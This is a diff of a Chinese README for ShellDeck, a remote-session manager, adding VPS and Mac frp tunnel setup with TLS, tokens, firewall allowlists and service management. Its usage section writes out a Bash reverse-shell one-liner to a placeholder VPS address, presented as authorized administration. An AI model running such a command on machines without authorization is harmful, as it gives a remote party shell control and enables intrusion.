@@ -19,7 +19,7 @@
 常用入口：
 
 - [人工操作](#快速开始)
-- [接入已有 frp](#frp-deployment)：[配置文件](#frp-config) · [启动 ShellDeck](#frp-start) · [接入说明](docs/frp.md)
+- [VPS / Mac 独立部署](#frp-deployment)：[VPS 管理](#frps-systemd) · [Mac 管理](#frpc-launchd) · [日常使用](#frp-start) · [接入说明](docs/frp.md)
 - [给 agent 添加 MCP 并使用](#agent-mcp)
 - [CLI 接入](#外部-ai-agent-操作会话)
 - [CentOS 6/7 测试方法](#centos-tests)
@@ -46,23 +46,142 @@ python3 shelldeck.py -p 9000
 
 <a id="frp-deployment"></a>
 
-### 接入已有 frp
+### VPS / Mac 独立部署与使用
 
-frp 按[官方安装指引](https://gofrp.org/zh-cn/docs/setup/)独立安装和管理：VPS 运行 frps，本机运行 frpc。长期运行方式见[官方 systemd 示例](https://gofrp.org/zh-cn/docs/setup/systemd/)或所用平台的服务管理文档；已有服务直接复用。frp 的启动项、鉴权、TLS 和 VPS 访问白名单属于该部署，不由 ShellDeck 管理。
+**部署一次后，日常只需在 Mac 终端运行 `shelldeck`。** VPS 的 frps 和 Mac 的 frpc 分别常驻，由系统管理；ShellDeck 在管理菜单输入 `quit` 后退出，frp 继续运行。已完成部署可直接跳到[日常使用](#frp-start)。
 
-ShellDeck 只负责本机控制台和会话。用时输入 `shelldeck`，在管理菜单输入 `quit` 退出；frp 继续常驻。
+frp 按[官方安装指引](https://gofrp.org/zh-cn/docs/setup/)独立安装，VPS 无需下载 ShellDeck。下面是原生 systemd / launchd 的配置示例，ShellDeck 不负责安装或管理这些服务。
 
 ```text
-客户端 Bash ←→ VPS frps :9099 ←→ 常驻 frpc ←→ 本机 ShellDeck 127.0.0.1:19000
+客户端 Bash ←→ VPS frps :9099 ←→ Mac 常驻 frpc ←→ ShellDeck 127.0.0.1:19000
 ```
 
 <a id="frp-config"></a>
 
-#### 引用现有代理配置
+#### 配置与目录约定
 
-在已有 frpc 配置中加入 [TCP 代理片段](examples/frp/proxy.toml)，由原 frpc 服务加载：
+| 位置 | 程序与管理方式 | 配置示例位置 |
+| --- | --- | --- |
+| VPS（Linux） | frps，`frps.service` 开机自启 | `/etc/frp/frps.toml` |
+| Mac | frpc，`local.frp.frpc` 在用户登录后自启 | `~/.config/frp/frpc.toml` |
+| Mac / Linux | `shelldeck`，交互终端内按需启动 | `~/.config/shelldeck/config.json` |
+
+下文目录均为通用建议，可按实际安装位置调整。已有 frp 服务应直接复用原配置、凭据和证书，**不要用示例覆盖完整配置，也不要再创建第二个 frpc 服务**。新增 ShellDeck 接入时，只需合并 [TCP 代理片段](examples/frp/proxy.toml)，再让 ShellDeck 引用它。
+
+示例固定使用三个不同用途的端口：`7000` 是 frpc 连接 frps 的控制端口，`9099` 是客户端回连 VPS 的端口，`19000` 仅供本机 frpc 连接 ShellDeck。客户端不连接 `7000` 或 `19000`。
+
+<a id="frps-systemd"></a>
+
+#### VPS：独立运行 frps
+
+从官方发行包选择 VPS 对应的系统和架构，校验后解压；以下以程序安装到 `/usr/local/bin/frps` 为例。首次安装可在解压目录执行：
+
+```sh
+sudo install -m 0755 ./frps /usr/local/bin/frps
+sudo useradd --system --user-group --no-create-home --shell /usr/sbin/nologin frp
+sudo install -d -o root -g frp -m 0750 /etc/frp
+```
+
+已有 `frp` 系统用户时跳过创建；`nologin` 路径按发行版调整。准备 `/etc/frp/frps.toml`：
 
 ```toml
+bindAddr = "0.0.0.0"
+bindPort = 7000
+proxyBindAddr = "0.0.0.0"
+allowPorts = [{ single = 9099 }]
+auth.method = "token"
+auth.token = "REPLACE_WITH_SHARED_RANDOM_TOKEN"
+transport.tls.force = true
+transport.tls.certFile = "/etc/frp/server.crt"
+transport.tls.keyFile = "/etc/frp/server.key"
+log.to = "console"
+```
+
+首次部署用 `openssl rand -hex 32` 生成随机 token，两端填写同一值。按[官方 TLS 指引](https://gofrp.org/zh-cn/docs/features/common/network/network-tls/)准备服务端证书和私钥，证书 SAN 必须匹配 Mac 配置中的 VPS 域名或 IP。Mac 只需要受信任的 CA 证书；自签证书场景可使用服务端证书作为信任锚，私钥留在 VPS。
+
+将配置和证书放好后限制权限，并校验配置：
+
+```sh
+sudo chown root:frp /etc/frp/frps.toml /etc/frp/server.crt /etc/frp/server.key
+sudo chmod 0640 /etc/frp/frps.toml /etc/frp/server.crt /etc/frp/server.key
+sudo -u frp /usr/local/bin/frps verify -c /etc/frp/frps.toml
+```
+
+**启动前先配置访问白名单。** 在 VPS 的防火墙及云安全组中分别限制：
+
+| TCP 端口 | 允许来源 |
+| --- | --- |
+| `7000` | 运行 frpc 的 Mac 公网出口 IP/CIDR |
+| `9099` | 获准回连的客户端公网出口 IP/CIDR |
+
+其他来源拒绝访问这两个端口；同时检查 IPv6，保留已有 SSH 和其他业务规则。`allowPorts` 只限制 frp 可绑定的端口，不是来源 IP 白名单。token 只认证 frpc，TLS 只保护 frpc 与 frps 之间的链路；客户端到 VPS 的 Bash 连接仍是原始 TCP，需放在可信网络或受控隧道内。
+
+防火墙规则需要持久化，并在 frps 启动前加载。下面的 Debian/Ubuntu 示例采用 `netfilter-persistent`：先安装并配置它，保存 IPv4 / IPv6 规则到 `/etc/iptables/rules.v4`、`rules.v6`，启用其开机加载。使用其他防火墙时，按实际服务调整下面的 `Requires` 和 `After`；不要额外引入第二套防火墙管理方式。
+
+参考[官方 systemd 用法](https://gofrp.org/zh-cn/docs/setup/systemd/)，将以下内容保存为 `/etc/systemd/system/frps.service`；程序和配置使用实际绝对路径：
+
+```ini
+[Unit]
+Description=frp server
+Wants=network-online.target
+Requires=netfilter-persistent.service
+After=network-online.target netfilter-persistent.service
+
+[Service]
+Type=simple
+User=frp
+Group=frp
+ExecStart=/usr/local/bin/frps -c /etc/frp/frps.toml
+Restart=on-failure
+RestartSec=5
+UMask=0077
+NoNewPrivileges=true
+
+[Install]
+WantedBy=multi-user.target
+```
+
+配置校验通过、白名单已生效后，首次启动并设置开机自启：
+
+```sh
+sudo systemctl daemon-reload
+sudo systemctl enable --now frps.service
+```
+
+日常管理：
+
+| 操作 | 命令 |
+| --- | --- |
+| 查看状态 / 开机自启 | `sudo systemctl status frps.service` / `sudo systemctl is-enabled frps.service` |
+| 查看日志 | `sudo journalctl -u frps.service -n 100 --no-pager` |
+| 修改 frps 配置后 | 先执行上面的 `frps verify`，通过后 `sudo systemctl restart frps.service` |
+| 修改 unit 后 | `sudo systemctl daemon-reload`，再 `sudo systemctl restart frps.service` |
+| 暂停 / 恢复 | `sudo systemctl stop frps.service` / `sudo systemctl start frps.service` |
+| 停止并取消开机自启 | `sudo systemctl disable --now frps.service` |
+
+<a id="frpc-launchd"></a>
+
+#### Mac：独立运行 frpc
+
+从同一 frp 版本的官方发行包选择 `darwin_arm64`（Apple 芯片）或 `darwin_amd64`（Intel）。首次安装可在解压目录执行：
+
+```sh
+mkdir -p "$HOME/.local/bin" "$HOME/.config/frp" "$HOME/Library/Logs/frp"
+install -m 0755 ./frpc "$HOME/.local/bin/frpc"
+chmod 0700 "$HOME/.config/frp" "$HOME/Library/Logs/frp"
+```
+
+将受信任的 CA 证书通过 SSH 等可信方式复制到 Mac 的 frp 配置目录，以下以文件名 `server.crt` 为例。在 `~/.config/frp/frpc.toml` 填写：
+
+```toml
+serverAddr = "frp.example.net"
+serverPort = 7000
+auth.method = "token"
+auth.token = "REPLACE_WITH_SHARED_RANDOM_TOKEN"
+transport.tls.enable = true
+transport.tls.trustedCaFile = "/absolute/path/to/frp/server.crt"
+log.to = "console"
+
 [[proxies]]
 name = "shelldeck"
 type = "tcp"
@@ -72,7 +191,73 @@ remotePort = 9099
 transport.proxyProtocolVersion = "v1"
 ```
 
-这是代理片段，frp 的服务器地址、凭据和证书继续使用原配置。VPS 的 frps 需允许该代理使用 `9099`，防火墙需允许预期客户端访问此端口。frpc 与 ShellDeck 位于同一机器、同一网络命名空间。
+把 `frp.example.net` 换成 VPS 的真实域名或 IPv4，将 token 与 VPS 保持一致。`trustedCaFile` 填 Mac 上证书的**实际绝对路径**；TOML 中的普通路径字符串不会展开 `~` 或 `$HOME`。不要省略证书校验配置；仅开启 TLS 不等于校验了服务端身份。
+
+`transport.proxyProtocolVersion = "v1"` 保留 VPS 看到的客户端来源地址；`localIP` 保持 IPv4 回环。frpc 与 ShellDeck 必须在同一机器、同一网络命名空间。
+
+下面三个变量是首次注册服务时的路径输入；已有安装可改成原来的位置。先限制配置权限并校验：
+
+```sh
+export FRPC_BIN="$HOME/.local/bin/frpc"
+export FRPC_CONFIG="$HOME/.config/frp/frpc.toml"
+export FRPC_LOG_DIR="$HOME/Library/Logs/frp"
+chmod 0600 "$FRPC_CONFIG"
+"$FRPC_BIN" verify -c "$FRPC_CONFIG"
+```
+
+校验通过后，在同一终端首次生成用户 LaunchAgent。使用 Python 写入 plist，可正确处理路径中的空格和 XML 特殊字符，并把路径展开为绝对路径；launchd 本身不展开 `~` 或 `$HOME`。已有 `local.frp.frpc` 时跳过此步，直接使用下方管理命令：
+
+```sh
+python3 - <<'PY'
+import os
+import plistlib
+from pathlib import Path
+
+os.umask(0o077)
+binary = Path(os.environ["FRPC_BIN"]).expanduser().resolve(strict=True)
+config = Path(os.environ["FRPC_CONFIG"]).expanduser().resolve(strict=True)
+logs = Path(os.environ["FRPC_LOG_DIR"]).expanduser().resolve()
+logs.mkdir(parents=True, exist_ok=True)
+plist = Path.home() / "Library/LaunchAgents/local.frp.frpc.plist"
+plist.parent.mkdir(parents=True, exist_ok=True)
+with plist.open("xb") as handle:
+    plistlib.dump({
+        "Label": "local.frp.frpc",
+        "ProgramArguments": [str(binary), "-c", str(config)],
+        "RunAtLoad": True,
+        "KeepAlive": True,
+        "ThrottleInterval": 5,
+        "Umask": 0o077,
+        "StandardOutPath": str(logs / "frpc.log"),
+        "StandardErrorPath": str(logs / "frpc.error.log"),
+    }, handle)
+PY
+```
+
+该命令拒绝覆盖已有 plist。确认没有 Homebrew、其他 LaunchAgent 或手动启动的 frpc 使用同一代理，再在已登录的 Mac 用户终端注册：
+
+```sh
+plutil -lint "$HOME/Library/LaunchAgents/local.frp.frpc.plist"
+launchctl enable "gui/$(id -u)/local.frp.frpc"
+launchctl bootstrap "gui/$(id -u)" "$HOME/Library/LaunchAgents/local.frp.frpc.plist"
+```
+
+这是**用户登录后自启**的 LaunchAgent，不是在登录前运行的系统服务。退出登录、Mac 休眠或断网会使回连不可用；恢复隧道后客户端重新连接。
+
+| 操作 | 命令 |
+| --- | --- |
+| 查看状态和 PID | `launchctl print "gui/$(id -u)/local.frp.frpc"` |
+| 查看日志 | `tail -n 100 "$HOME/Library/Logs/frp/frpc.log" "$HOME/Library/Logs/frp/frpc.error.log"`（自定义目录时相应调整） |
+| 修改 frpc 配置后 | 先用实际路径运行 `frpc verify -c ...`，通过后 `launchctl kickstart -k "gui/$(id -u)/local.frp.frpc"` |
+| 本次登录期间停止 | `launchctl bootout "gui/$(id -u)/local.frp.frpc"` |
+| 再次启动 | 对未加载的服务执行上面的 `launchctl bootstrap`；若曾禁用，先 `launchctl enable` |
+| 取消以后登录自启 | `launchctl disable "gui/$(id -u)/local.frp.frpc"`，若当前已加载，再执行 `launchctl bootout` |
+
+修改 plist 中的程序、配置或日志路径后，先 `plutil -lint`，再 `bootout`、`bootstrap` 重新加载；单独 `kickstart` 不会重读 plist。不要对已加载的服务重复 `bootstrap`，也不要靠结束进程暂停服务：`KeepAlive` 会将它重新拉起。重启任一 frp 进程会中断经它转发的现有会话。
+
+本机若是 Linux，使用原有 systemd 管理 frpc，按官方示例将启动命令设为 `frpc -c <配置绝对路径>`；后面的 ShellDeck 配置和日常用法相同。
+
+#### ShellDeck：引用同一份 frpc 配置
 
 将 [ShellDeck 配置示例](examples/shelldeck.json) 保存为 `~/.config/shelldeck/config.json`，把 `frpc_config` 改成现有 frpc 配置的实际路径：
 
@@ -96,7 +281,7 @@ ShellDeck 从所选代理读取本地监听地址、端口和 PROXY v1，不重�
 python3 scripts/install.py
 ```
 
-安装器生成 `~/.local/bin/shelldeck`，绑定安装时的 Python、仓库和 ShellDeck 配置。确认 `~/.local/bin` 已加入 `PATH`；移动仓库或更换 Python 后重新安装即可。自定义配置位置时使用 `python3 scripts/install.py --config /absolute/path/to/config.json`。
+安装器生成 `~/.local/bin/shelldeck`，绑定安装时的 Python、仓库和 ShellDeck 配置。确认 `~/.local/bin` 已加入 `PATH`；缺少时在自己的 shell 配置中加入 `export PATH="$HOME/.local/bin:$PATH"` 并重新打开终端。移动仓库或更换 Python 后重新安装即可。自定义配置位置时使用 `python3 scripts/install.py --config /absolute/path/to/config.json`。
 
 之后每次在交互终端运行：
 
@@ -104,11 +289,33 @@ python3 scripts/install.py
 shelldeck
 ```
 
-保持终端打开，让已获准访问的客户端连接 VPS 的 **9099**。`ls` 查看会话，`i ID` 进入会话，**Ctrl+]** 返回菜单，菜单中的 `quit` 停止 ShellDeck。关闭终端也会结束运行。退出后会话断开，再次启动后由客户端重新连接；frp 继续运行。
+保持终端打开，在获准访问的客户端执行下面的命令，将 `VPS_IPV4` 换成 VPS 的 IPv4 地址，或只解析到该 IPv4 的域名：
+
+```bash
+bash -c 'bash -i >& /dev/tcp/VPS_IPV4/9099 0>&1'
+```
+
+回到 ShellDeck，`ls` 查看会话，`i ID` 进入会话，**Ctrl+]** 返回菜单，菜单中的 `quit` 停止 ShellDeck。关闭终端也会结束运行。退出后会话断开，再次启动后由客户端重新连接；frp 继续运行。这里回连端口是 **9099**，下文直连示例的 `9000` 属于另一种使用方式。
 
 原参数仍可使用，例如 `shelldeck -t 1800`。每次启动重新读取共享代理配置；修改监听目标时改原 frpc 配置并让 frpc 加载变更，再重启 ShellDeck。与配置冲突的 `-H` / `-p` 会报错。CLI/MCP 在 ShellDeck 运行期间使用配置中的同一个控制 socket。
 
 已有外置配置可继续使用；若仍引用仓库内的完整 frpc 示例，升级前先按[迁移说明](docs/frp.md#shelldeck-配置)将其移到项目外，并更新 frpc 和 ShellDeck 的配置路径。配置读取成功不等于隧道可用，首次接入仍需[验证真实回连](docs/frp.md#验证)。
+
+#### 验证与日常维护
+
+首次部署或修改配置后，从允许的来源回连，确认 `ls` 显示客户端的公网出口 IP，进入会话执行 `hostname` 等无害命令，再用 [CLI 文件传输](#文件上传与下载)上传、下载临时文件并核对 SHA-256。退出并重新启动 ShellDeck 后验证新连接，同时确认 frpc 仍常驻；从白名单外的来源验证 `7000`、`9099` 被拒绝。具体测试入口见[接入验证](docs/frp.md#验证)。
+
+| 现象或变更 | 检查 / 处理 |
+| --- | --- |
+| `shelldeck` 命令找不到 | 确认 `~/.local/bin` 在 `PATH`，移动仓库或更换 Python 后重新安装命令 |
+| frpc 无法登录 VPS | 查 frpc / frps 日志，核对 `7000` 白名单、token、CA 证书和证书 SAN |
+| `9099` 可连接但没有会话 | 确认 ShellDeck 正在运行、frpc 代理注册成功，本地目标及 PROXY v1 配置一致；端口开放不代表 ShellDeck 已启动 |
+| 来源地址不符合预期 | 核对 PROXY v1；记录的是 VPS 看到的出口 IPv4，同一 NAT 后的机器可能共用该地址 |
+| 修改本地监听地址或端口 | 只改原 frpc 配置，校验后重启 frpc，再重启 ShellDeck 重新读取 |
+| Mac 或客户端公网出口变化 | 分别更新 `7000` 或 `9099` 的白名单并持久化，不能用局域网地址代替公网出口 |
+| 证书续期或凭据轮换 | 更新 frp 两端所需文件并验证、重启服务；ShellDeck 不保存这些凭据 |
+
+**Mac 通常不需要 DDNS 或路由器端口映射**，因为 frpc 主动连接 VPS。VPS 地址固定时使用 IP 或普通 DNS 即可；只有 VPS 地址变化且希望保持同一域名时才需要更新 DNS，DDNS 也不会自动更新访问白名单。
 
 #### 下载部署脚本的配置
 
